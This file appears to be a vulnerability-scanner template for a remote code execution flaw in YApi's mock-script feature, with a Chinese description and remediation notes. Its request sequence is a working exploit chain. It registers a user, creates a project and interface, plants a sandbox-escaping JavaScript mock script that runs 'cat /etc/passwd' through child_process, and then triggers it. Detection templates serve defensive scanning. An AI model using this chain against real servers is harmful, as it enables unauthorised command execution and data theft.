id: yapi-rce
info:
  name: Yapi Remote Code Execution
  author:
  - l0ne1y
  tags:
  - yapi
  - rce
  description: |-
    Yapi远程命令执行漏洞
    YAPI使用mock数据/脚本作为中间交互层，其中mock数据通过设定固定数据返回固定内容，对于需要根据用户请求定制化响应内容的情况mock脚本通过写JS脚本的方式处理用户请求参数返回定制化内容，本次漏洞就是发生在mock脚本服务上。由于mock脚本自定义服务未对JS脚本加以命令过滤，用户可以添加任何请求处理脚本，因此可以在脚本中植入命令，等用户访问接口发起请求时触发命令执行。
  reference:
  - https://www.secpulse.com/archives/162502.html
  - https://gist.github.com/pikpikcu/0145fb71203c8a3ad5c67b8aab47165b
  - https://twitter.com/sec715/status/1415484190561161216
  - https://github.com/ymfe/yapi
  severity: critical
  remediation: |
    官方修复方案：
    1、建议用户到官方获取最新补丁或者最新版本程序：

    临时修复方案：
    1、尽量不去执行外部的应用程序或命令。
    2、使用自定义函数或函数库实现外部应用程序或命令的功能。
    3、在执行system、eval等命令执行功能的函数前，校验参数内容。
    4、使用escapeshellarg函数处理相关参数。Escapeshellarg函数会将任何引起参数或命令结束的字符进行转义，如单引号“’”会被转义为“\\’”，双引号“””会被转义为“\\””，分号“;”会被转义为“\\;”，这样escapeshellarg会将参数内容限制在一对单引号或双引号里面，转义参数中所包含的单引号或双引号，使其无法对当前执行进行截断，实现防范命令注入攻击的目的。
    5、使用safe_mode_exec_dir执行可执行的文件路径。将php.ini文件中的safe_mode设置为On，然后将允许执行的文件放入一个目录中，并使用safe_mode_exec_dir指定这个可执行的文件路径。在需要执行相应的外部程序时，程序必须在safe_mode_exec_dir指定的目录中才会允许执行，否则执行将失败。'
requests:
- matchers:
  - type: regex
    part: body
    regex:
    - 'root:.*:0:0:'
  - type: status
    status:
    - 200
  extractors:
  - name: group_id
    type: regex
    regex:
    - '"_id":([0-9]+),"group_name"'
    group: 1
    part: body
    internal: true
  - name: interface_id
    type: regex
    regex:
    - '"req_body_form":\[\],"_id":([0-9]+)'
    group: 1
    part: body
    internal: true
  - name: project_id
    type: regex
    regex:
    - '"tag":\[\],"_id":([0-9]+)'
    group: 1
    part: body
    internal: true
  matchers-condition: and
  raw:
  - |
    POST /api/user/reg HTTP/1.1
    Host: {{Hostname}}
    Content-Type: application/json;charset=UTF-8

    {"email":"{{randstr}}@example.com","password":"{{randstr}}","username":"{{randstr}}"}
  - |
    GET /api/group/list HTTP/1.1
    Host: {{Hostname}}
    Content-Type: application/json, text/plain, */*
  - |
    POST /api/project/add HTTP/1.1
    Host: {{Hostname}}
    Content-Type: application/json;charset=UTF-8

    {"name":"{{randstr}}","basepath":"","group_id":"{{group_id}}","icon":"code-o","color":"cyan","project_type":"private"}
  - |
    GET /api/project/get?id={{project_id}} HTTP/1.1
    Host: {{Hostname}}
  - |
    POST /api/interface/add HTTP/1.1
    Host: {{Hostname}}
    Content-Type: application/json;charset=UTF-8

    {"method":"GET","catid":"{{project_id}}","title":"{{randstr_1}}","path":"/{{randstr_1}}","project_id":{{project_id}}}
  - |
    POST /api/plugin/advmock/save HTTP/1.1
    Host: {{Hostname}}
    Content-Type: application/json;charset=UTF-8

    {"project_id":"{{project_id}}","interface_id":"{{interface_id}}","mock_script":"const sandbox = this\r\nconst ObjectConstructor = this.constructor\r\nconst FunctionConstructor = ObjectConstructor.constructor\r\nconst myfun = FunctionConstructor('return process')\r\nconst process = myfun()\r\nmockJson = process.mainModule.require(\"child_process\").execSync(\"cat /etc/passwd\").toString()","enable":true}
  - |
    GET /mock/{{project_id}}/{{randstr_1}} HTTP/1.1
    Host: {{Hostname}}
  cookie-reuse: true
